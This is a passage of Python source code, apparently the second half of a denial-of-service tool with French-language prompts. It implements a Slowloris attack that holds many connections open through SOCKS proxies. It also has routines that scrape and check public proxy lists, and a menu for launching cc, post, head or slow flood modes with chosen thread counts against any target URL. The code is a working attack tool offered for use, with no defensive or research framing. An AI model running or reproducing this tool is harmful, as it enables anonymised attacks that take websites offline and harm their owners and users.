					if not sent:
						ind_rlock.acquire()
						ind_dict[(proxy[0]+":"+proxy[1]).strip()] += n
						ind_rlock.release()
						proxy = Choice(proxies).strip().split(":")
						break
				s.close()
			except:
				s.close()
			ind_rlock.acquire()
			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
			ind_rlock.release()
		except:
			s.close()

socket_list=[]
def slow(conn,socks_type):
	proxy = Choice(proxies).strip().split(":")
	for _ in range(conn):
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(1)
			s.connect((str(target), int(port)))
			if str(port) == '443':
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format
			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
			if cookies != "":
				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
			s.send(("Connection:keep-alive").encode("utf-8"))
			
			socket_list.append(s)
			sys.stdout.write("[*] slow attaque en cours  || Delais: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
		except:
			s.close()
			proxy = Choice(proxies).strip().split(":")#changer et tester les proxy pour les rendres en ligne et puissant
			sys.stdout.write("[*] slow attaque en cours || Delais: "+str(len(socket_list))+"\r")
			sys.stdout.flush()
	while True:
		for s in list(socket_list):
			try:
				s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
				sys.stdout.write("[*] slow attaque en cours  || Delais: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				s.close()
				socket_list.remove(s)
				sys.stdout.write("[*] slow attaque en cours  || Delais: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
		proxy = Choice(proxies).strip().split(":")
		for _ in range(conn - len(socket_list)):
			try:
				if socks_type == 4:
					s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
				if socks_type == 5:
					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
				s.settimeout(1)
				s.connect((str(target), int(port)))
				if int(port) == 443:
					ctx = ssl.SSLContext()
					s = ctx.wrap_socket(s,server_hostname=target)
				s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format
				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
				if cookies != "":
					s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
				s.send(("Connection:keep-alive").encode("utf-8"))
				socket_list.append(s)
				sys.stdout.write("[*] slow attaque en cours || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
			except:
				proxy = Choice(proxies).strip().split(":")
				sys.stdout.write("[*] slow attaque en cours || Connections: "+str(len(socket_list))+"\r")
				sys.stdout.flush()
				pass
nums = 0
def checking(lines,socks_type,ms,rlock,):
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if socks_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if socks_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			s.settimeout(ms)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext()
				s = ctx.wrap_socket(s,server_hostname=target)
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):
	global nums
	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		if choice == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
			th.start()
		if choice == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("# Check "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("# Check "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> les proxy sont check et il y a "+str(len(proxies)))
	ans = input("# voulez vous les enregistrer ? (y/n, defaut=y)")
	if ans == "y" or ans == "":
		if choice == "4":
			with open("socks4.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("# Sauvegarder dans socks4.txt.")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("# Sauvegarder dans socks5.txt.")
			
def check_list(socks_file):
	print("# Checking list...")
	temp = open(socks_file).readlines()
	temp_list = []
	for i in temp:
		if i not in temp_list:
			if ':' in i:
				temp_list.append(i)
	rfile = open(socks_file, "wb")
	for i in list(temp_list):
		rfile.write(bytes(i,encoding='utf-8'))
	rfile.close()

def downloadsocks(choice):
	if choice == "4":
		f = open("socks4.txt",'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks4",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxyscan.io/download?type=socks4",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",timeout=5)
			f.write(r.content)
			f.close()
		except:
			f.close()
		try:#credit to All3xJ
			r = requests.get("https://www.socks-proxy.net/",timeout=5)
			part = str(r.content)
			part = part.split("<tbody>")
			part = part[1].split("</tbody>")
			part = part[0].split("<tr><td>")
			proxies = ""
			for proxy in part:
				proxy = proxy.split("</td><td>")
				try:
					proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
				except:
					pass
				out_file = open("socks4.txt","a")
				out_file.write(proxies)
				out_file.close()
		except:
			pass
		print("# Have already downloaded socks4 list as socks4.txt")
	if choice == "5":
		f = open("socks5.txt",'wb')
		try:
			r = requests.get("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://github.com/TheSpeedX/PROXY-List/blob/master/socks5.txt",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://github.com/jetkai/proxy-list/blob/main/online-proxies/txt/proxies-socks5.txt",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc&protocols=socks5&anonymityLevel=elite&anonymityLevel=anonymous&anonymityLevel=transparent",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://www.proxyscan.io/download?type=socks5",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",timeout=5)
			f.write(r.content)
		except:
			pass
		try:
			r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",timeout=5)
			f.write(r.content)
			f.close()
		except:
			f.close()
		print("# vous avez deja la liste socks5 installer : socks5.txt")
	
def main():
	global multiple
	global choice
	global data
	global mode2
	global cookies
	global brute
	global url
	print("# Mode d'attaque : [cc/post/head/slow/check]")
	mode = InputOption("# Mode d'attaque (default=cc) :",["cc","post","head","slow","check"],"cc")
	url = str(input("# url cible:")).strip()
	ParseUrl(url)
	if mode == "post":
		mode2 = InputOption("# Customiser les datas post? (y/n, defaut=n):",["y","n","yes","no"],"n")
		if mode2 == "y":
			data = open(str(input("#Destination du fichier:")).strip(),"r",encoding="utf-8", errors='ignore').readlines()
			data = ' '.join([str(txt) for txt in data])
	choice2 = InputOption("# Cookies personaliser ? (y/n, defaut=n):",["y","n","yes","no"],"n")
	if choice2 == "y":
		cookies = str(input("# Entrez les cookies:")).strip()
	choice = InputOption("# Socks 4 ou 5 ? (4/5, defaut=5):",["4","5"],"5")
	if choice == "4":
		socks_type = 4
	else:
		socks_type = 5
	if mode == "check":
		CheckerOption()
		print("# Fin du processus")
		return
	if mode == "slow":	
		thread_num = str(input("# Connexion (defaut=400):"))
	else:
		thread_num = str(input("# Threads(defaut=400):"))
	if thread_num == "":
		thread_num = int(400)
	else:
		try:
			thread_num = int(thread_num)
		except:
			sys.exit("Erreur de threads")
	CheckerOption()
	if len(proxies) == 0:
		print("# proxy indisponible, veuillez en re télécharger...")
		return
	ind_rlock = threading.RLock()
	if mode == "slow":
		input("~appuyer sur entrez~")
		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
		th.setDaemon(True)
		th.start()
	else:
		multiple = str(input("# Puissance ? (defaut=100):"))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input("# Boost mode ? [beta](y/n, defaut=n):"))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
		elif brute == "n":
			brute = False
		event = threading.Event()
		print("# Creation des threads...")
		SetupIndDict()
		build_threads(mode,thread_num,event,socks_type,ind_rlock)
		event.clear()
		input("~presser entrez pour continuer~.")
		event.set()
		threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
	while True:
		try:
			time.sleep(0.1)
		except KeyboardInterrupt:
			break
	

if __name__ == "__main__":
	main()
